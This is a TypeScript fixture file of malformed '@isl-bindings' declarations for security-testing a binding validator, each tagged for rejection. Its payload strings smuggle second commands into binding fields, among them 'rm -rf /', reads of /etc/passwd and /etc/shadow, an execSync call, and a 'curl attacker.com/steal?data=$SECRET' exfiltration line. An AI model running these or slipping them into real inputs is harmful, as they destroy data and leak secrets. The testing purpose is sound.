/**
 * Malformed Bindings Fixtures for Security Testing
 *
 * This file contains malicious binding declarations that attempt:
 * - Path traversal attacks
 * - Invalid line range exploitation
 * - Code injection via binding locations
 * - Malformed JSON structure attacks
 */

export interface MalformedBindingFixture {
  id: string;
  category:
    | 'path_traversal'
    | 'invalid_line_range'
    | 'code_injection'
    | 'malformed_json'
    | 'type_confusion';
  description: string;
  binding: string;
  expectedBehavior: 'REJECT' | 'SANITIZE';
  severity: 'critical' | 'high' | 'medium';
}

/**
 * Path traversal attempts in binding locations
 */
export const PATH_TRAVERSAL_BINDINGS: MalformedBindingFixture[] = [
  {
    id: 'PT-001',
    category: 'path_traversal',
    description: 'Unix-style path traversal to /etc/passwd',
    binding: `/**
 * @isl-bindings
 * @spec ../../../../../../etc/passwd
 * CreateUser.pre.1 -> guard:../../../etc/passwd
 */`,
    expectedBehavior: 'REJECT',
    severity: 'critical',
  },
  {
    id: 'PT-002',
    category: 'path_traversal',
    description: 'Windows-style path traversal',
    binding: `/**
 * @isl-bindings
 * @spec ..\\..\\..\\windows\\system32\\config\\sam
 * CreateUser.pre.1 -> guard:..\\..\\..\\windows\\system32
 */`,
    expectedBehavior: 'REJECT',
    severity: 'critical',
  },
  {
    id: 'PT-003',
    category: 'path_traversal',
    description: 'URL-encoded path traversal',
    binding: `/**
 * @isl-bindings
 * @spec %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
 * CreateUser.pre.1 -> guard:%2e%2e%2fconfig
 */`,
    expectedBehavior: 'REJECT',
    severity: 'critical',
  },
  {
    id: 'PT-004',
    category: 'path_traversal',
    description: 'Double-encoded path traversal',
    binding: `/**
 * @isl-bindings
 * @spec %252e%252e%252f%252e%252e%252fetc%252fpasswd
 * CreateUser.pre.1 -> guard:%252e%252e%252f
 */`,
    expectedBehavior: 'REJECT',
    severity: 'critical',
  },
  {
    id: 'PT-005',
    category: 'path_traversal',
    description: 'Null byte path truncation',
    binding: `/**
 * @isl-bindings
 * @spec safe.isl%00../../etc/passwd
 * CreateUser.pre.1 -> guard:validateUser%00;rm -rf /
 */`,
    expectedBehavior: 'REJECT',
    severity: 'critical',
  },
  {
    id: 'PT-006',
    category: 'path_traversal',
    description: 'Absolute path injection',
    binding: `/**
 * @isl-bindings
 * @spec /etc/passwd
 * CreateUser.pre.1 -> guard:/etc/shadow
 */`,
    expectedBehavior: 'REJECT',
    severity: 'critical',
  },
  {
    id: 'PT-007',
    category: 'path_traversal',
    description: 'UNC path injection (Windows network)',
    binding: `/**
 * @isl-bindings
 * @spec \\\\attacker.com\\share\\malicious.isl
 * CreateUser.pre.1 -> guard:\\\\attacker\\payload
 */`,
    expectedBehavior: 'REJECT',
    severity: 'critical',
  },
  {
    id: 'PT-008',
    category: 'path_traversal',
    description: 'File protocol URL injection',
    binding: `/**
 * @isl-bindings
 * @spec file:///etc/passwd
 * CreateUser.pre.1 -> guard:file://localhost/etc/shadow
 */`,
    expectedBehavior: 'REJECT',
    severity: 'critical',
  },
];

/**
 * Invalid line range exploitation attempts
 */
export const INVALID_LINE_RANGE_BINDINGS: MalformedBindingFixture[] = [
  {
    id: 'LR-001',
    category: 'invalid_line_range',
    description: 'Negative line number',
    binding: `/**
 * @isl-bindings
 * CreateUser.pre.1 -> guard:L-1
 */`,
    expectedBehavior: 'REJECT',
    severity: 'high',
  },
  {
    id: 'LR-002',
    category: 'invalid_line_range',
    description: 'Zero line number',
    binding: `/**
 * @isl-bindings
 * CreateUser.pre.1 -> guard:L0
 */`,
    expectedBehavior: 'REJECT',
    severity: 'high',
  },
  {
    id: 'LR-003',
    category: 'invalid_line_range',
    description: 'Extremely large line number (integer overflow)',
    binding: `/**
 * @isl-bindings
 * CreateUser.pre.1 -> guard:L999999999999999999999
 */`,
    expectedBehavior: 'REJECT',
    severity: 'high',
  },
  {
    id: 'LR-004',
    category: 'invalid_line_range',
    description: 'Reversed line range (end < start)',
    binding: `/**
 * @isl-bindings
 * CreateUser.pre.1 -> guard:L100-L10
 */`,
    expectedBehavior: 'REJECT',
    severity: 'medium',
  },
  {
    id: 'LR-005',
    category: 'invalid_line_range',
    description: 'Non-numeric line number',
    binding: `/**
 * @isl-bindings
 * CreateUser.pre.1 -> guard:Labc
 */`,
    expectedBehavior: 'REJECT',
    severity: 'medium',
  },
  {
    id: 'LR-006',
    category: 'invalid_line_range',
    description: 'Float line number',
    binding: `/**
 * @isl-bindings
 * CreateUser.pre.1 -> guard:L3.14
 */`,
    expectedBehavior: 'REJECT',
    severity: 'medium',
  },
  {
    id: 'LR-007',
    category: 'invalid_line_range',
    description: 'Hexadecimal line number injection',
    binding: `/**
 * @isl-bindings
 * CreateUser.pre.1 -> guard:L0xDEADBEEF
 */`,
    expectedBehavior: 'REJECT',
    severity: 'medium',
  },
  {
    id: 'LR-008',
    category: 'invalid_line_range',
    description: 'Scientific notation line number',
    binding: `/**
 * @isl-bindings
 * CreateUser.pre.1 -> guard:L1e10
 */`,
    expectedBehavior: 'REJECT',
    severity: 'medium',
  },
  {
    id: 'LR-009',
    category: 'invalid_line_range',
    description: 'NaN line number',
    binding: `/**
 * @isl-bindings
 * CreateUser.pre.1 -> guard:LNaN
 */`,
    expectedBehavior: 'REJECT',
    severity: 'medium',
  },
  {
    id: 'LR-010',
    category: 'invalid_line_range',
    description: 'Infinity line number',
    binding: `/**
 * @isl-bindings
 * CreateUser.pre.1 -> guard:LInfinity
 */`,
    expectedBehavior: 'REJECT',
    severity: 'medium',
  },
];

/**
 * Code injection via binding location field
 */
export const CODE_INJECTION_BINDINGS: MalformedBindingFixture[] = [
  {
    id: 'CI-001',
    category: 'code_injection',
    description: 'Shell command injection in location',
    binding: `/**
 * @isl-bindings
 * CreateUser.pre.1 -> guard:validateUser; rm -rf /
 */`,
    expectedBehavior: 'REJECT',
    severity: 'critical',
  },
  {
    id: 'CI-002',
    category: 'code_injection',
    description: 'Command substitution in location',
    binding: `/**
 * @isl-bindings
 * CreateUser.pre.1 -> guard:\`whoami\`
 */`,
    expectedBehavior: 'REJECT',
    severity: 'critical',
  },
  {
    id: 'CI-003',
    category: 'code_injection',
    description: 'JavaScript eval in location',
    binding: `/**
 * @isl-bindings
 * CreateUser.pre.1 -> guard:eval(process.env.PAYLOAD)
 */`,
    expectedBehavior: 'REJECT',
    severity: 'critical',
  },
  {
    id: 'CI-004',
    category: 'code_injection',
    description: 'Pipe command injection',
    binding: `/**
 * @isl-bindings
 * CreateUser.pre.1 -> guard:validateUser | cat /etc/passwd
 */`,
    expectedBehavior: 'REJECT',
    severity: 'critical',
  },
  {
    id: 'CI-005',
    category: 'code_injection',
    description: 'Ampersand command chaining',
    binding: `/**
 * @isl-bindings
 * CreateUser.pre.1 -> guard:safe && curl attacker.com/steal?data=$SECRET
 */`,
    expectedBehavior: 'REJECT',
    severity: 'critical',
  },
  {
    id: 'CI-006',
    category: 'code_injection',
    description: 'Newline injection in location (embedded newline)',
    // This has a literal newline within the location field which should be rejected
    binding: `/**
 * @isl-bindings
 * CreateUser.pre.1 -> guard:safe\\nrm -rf /
 */`,
    expectedBehavior: 'REJECT',
    severity: 'critical',
  },
  {
    id: 'CI-007',
    category: 'code_injection',
    description: 'Template literal injection',
    binding: `/**
 * @isl-bindings
 * CreateUser.pre.1 -> guard:\${require('child_process').execSync('id')}
 */`,
    expectedBehavior: 'REJECT',
    severity: 'critical',
  },
  {
    id: 'CI-008',
    category: 'code_injection',
    description: 'Template literal injection in location',
    // Template literal syntax in location should be rejected
    binding: `/**
 * @isl-bindings
 * CreateUser.pre.1 -> guard:\${process.env.SECRET}
 */`,
    expectedBehavior: 'REJECT',
    severity: 'critical',
  },
];

/**
 * Malformed JSON/structure attacks
 */
export const MALFORMED_JSON_BINDINGS: MalformedBindingFixture[] = [
  {
    id: 'MJ-001',
    category: 'malformed_json',
    description: 'Prototype pollution via clauseId',
    binding: `/**
 * @isl-bindings
 * __proto__.isAdmin -> guard:fn:validate
 */`,
    expectedBehavior: 'REJECT',
    severity: 'critical',
  },
  {
    id: 'MJ-002',
    category: 'malformed_json',
    description: 'Constructor pollution',
    binding: `/**
 * @isl-bindings
 * constructor.prototype.admin -> guard:fn:validate
 */`,
    expectedBehavior: 'REJECT',
    severity: 'critical',
  },
  {
    id: 'MJ-003',
    category: 'malformed_json',
    description: 'Empty clauseId',
    binding: `/**
 * @isl-bindings
 *  -> guard:fn:validate
 */`,
    expectedBehavior: 'REJECT',
    severity: 'medium',
  },
  {
    id: 'MJ-004',
    category: 'malformed_json',
    description: 'Very long clauseId (DoS attempt)',
    binding: `/**
 * @isl-bindings
 * ${'A'.repeat(100000)} -> guard:fn:validate
 */`,
    expectedBehavior: 'REJECT',
    severity: 'high',
  },
  {
    id: 'MJ-005',
    category: 'malformed_json',
    description: 'Special characters in clauseId',
    binding: `/**
 * @isl-bindings
 * <script>alert(1)</script> -> guard:fn:validate
 */`,
    expectedBehavior: 'REJECT',
    severity: 'high',
  },
  {
    id: 'MJ-006',
    category: 'malformed_json',
    description: 'Unicode null in clauseId',
    binding: `/**
 * @isl-bindings
 * CreateUser\u0000.pre.1 -> guard:fn:validate
 */`,
    expectedBehavior: 'REJECT',
    severity: 'high',
  },
  {
    id: 'MJ-007',
    category: 'malformed_json',
    description: 'Invalid binding type',
    binding: `/**
 * @isl-bindings
 * CreateUser.pre.1 -> exploit:fn:validate
 */`,
    expectedBehavior: 'REJECT',
    severity: 'medium',
  },
  {
    id: 'MJ-008',
    category: 'malformed_json',
    description: 'Missing binding type',
    binding: `/**
 * @isl-bindings
 * CreateUser.pre.1 -> fn:validate
 */`,
    expectedBehavior: 'REJECT',
    severity: 'medium',
  },
];

/**
 * Type confusion attacks
 */
export const TYPE_CONFUSION_BINDINGS: MalformedBindingFixture[] = [
  {
    id: 'TC-001',
    category: 'type_confusion',
    description: 'Array as location',
    binding: `/**
 * @isl-bindings
 * CreateUser.pre.1 -> guard:[1,2,3]
 */`,
    expectedBehavior: 'REJECT',
    severity: 'medium',
  },
  {
    id: 'TC-002',
    category: 'type_confusion',
    description: 'Object notation in location',
    binding: `/**
 * @isl-bindings
 * CreateUser.pre.1 -> guard:{"__proto__": {"admin": true}}
 */`,
    expectedBehavior: 'REJECT',
    severity: 'critical',
  },
  {
    id: 'TC-003',
    category: 'type_confusion',
    description: 'Boolean literal syntax as clauseId',
    // Using actual JavaScript boolean syntax which isn't valid
    binding: `/**
 * @isl-bindings
 * !true -> guard:fn:validate
 */`,
    expectedBehavior: 'REJECT',
    severity: 'medium',
  },
  {
    id: 'TC-004',
    category: 'type_confusion',
    description: 'Number as clauseId',
    binding: `/**
 * @isl-bindings
 * 12345 -> guard:fn:validate
 */`,
    expectedBehavior: 'REJECT',
    severity: 'medium',
  },
  {
    id: 'TC-005',
    category: 'type_confusion',
    description: 'Symbol-like value in clauseId',
    binding: `/**
 * @isl-bindings
 * Symbol(exploit) -> guard:fn:validate
 */`,
    expectedBehavior: 'REJECT',
    severity: 'medium',
  },
];

/**
 * All malformed binding fixtures combined
 */
export const ALL_MALFORMED_BINDING_FIXTURES: MalformedBindingFixture[] = [
  ...PATH_TRAVERSAL_BINDINGS,
  ...INVALID_LINE_RANGE_BINDINGS,
  ...CODE_INJECTION_BINDINGS,
  ...MALFORMED_JSON_BINDINGS,
  ...TYPE_CONFUSION_BINDINGS,
];

/**
 * Get fixtures by category
 */
export function getBindingFixturesByCategory(
  category: MalformedBindingFixture['category']
): MalformedBindingFixture[] {
  return ALL_MALFORMED_BINDING_FIXTURES.filter((f) => f.category === category);
}

/**
 * Get fixtures by severity
 */
export function getBindingFixturesBySeverity(
  severity: MalformedBindingFixture['severity']
): MalformedBindingFixture[] {
  return ALL_MALFORMED_BINDING_FIXTURES.filter((f) => f.severity === severity);
}

/**
 * Valid bindings for comparison (should pass validation)
 */
export const VALID_BINDINGS: string[] = [
  `/**
 * @isl-bindings
 * @spec user.isl
 * CreateUser.pre.1 -> guard:fn:validateInput
 * CreateUser.post.1 -> assert:fn:checkResult
 */`,
  `/**
 * @isl-bindings
 * CreateUser.pre.1 -> guard:L42
 * CreateUser.pre.2 -> guard:L50-L60
 */`,
  `/**
 * @isl-bindings
 * Auth.verify.1 -> test:AuthService.verifyToken [token validation]
 */`,
  `// @isl-bindings
// @spec auth.isl
// Auth.login.pre.1 -> guard:validateCredentials`,
];
